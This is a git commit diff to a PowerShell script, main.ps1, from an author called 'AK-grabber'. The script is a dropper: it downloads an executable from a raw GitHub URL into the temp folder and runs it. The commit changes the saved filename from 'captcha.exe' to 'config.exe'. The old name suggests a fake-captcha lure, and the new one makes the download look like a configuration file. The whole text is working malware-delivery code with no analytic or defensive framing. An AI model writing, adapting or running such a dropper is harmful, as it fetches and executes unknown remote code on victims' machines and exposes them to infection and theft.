7cbecc76710c5dfdff4dd95abfee5aafb5a483a6
AK-grabber <akaltbytheg@gmail.com>
2025-02-21 04:18:49 +0300

    Update main.ps1

--- main.ps1
+++ main.ps1
@@ -1,4 +1,4 @@
 $dropperUrl = "https://raw.githubusercontent.com/AK-grabber/bahofbaoufbgo9uafi/raw/refs/heads/main/config.exe"
-$tempPath = "$env:TEMP\captcha.exe"
+$tempPath = "$env:TEMP\config.exe"
 Invoke-WebRequest -Uri $dropperUrl -OutFile $tempPath
 Start-Process -FilePath $tempPath
